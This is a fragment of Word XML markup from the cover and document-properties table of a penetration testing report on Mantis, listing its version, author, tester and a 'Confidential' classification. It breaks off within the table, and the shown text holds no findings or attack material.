      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251642368" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6E010540" wp14:editId="38336275">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="508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70" cy="179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1" w:name="page18"/>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="290" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Document Properties</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="20" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
      <w:pPr>
        <w:spacing w:line="319" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="1440" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="0000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1819"/>
        <w:gridCol w:w="7201"/>
      </w:tblGrid>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="332"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="000000"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="000000"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="000000"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="140"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Title</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="000000"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="000000"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="000000"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="004819BF">
            <w:pPr>
              <w:ind w:left="120"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Mantis</w:t>
            </w:r>
            <w:r w:rsidR="0029303A" w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> Penetration Testing Report</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="143"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="140"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="120"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>V1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="159"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="140"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Author</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="120"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Indrajeet Singh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="163"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="140"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Pen-testers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="120"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Indrajeet Singh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="163"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="140"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Reviewed By</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="163"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="140"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Approved By</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="163"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1819" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="140"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Classification</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7201" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="808080"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="808080"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="0029303A">
            <w:pPr>
              <w:ind w:left="120"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Confidential</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002D1253" w:rsidRPr="00802CE3">
        <w:trPr>
          <w:trHeight w:val="163"/>
        </w:trPr>
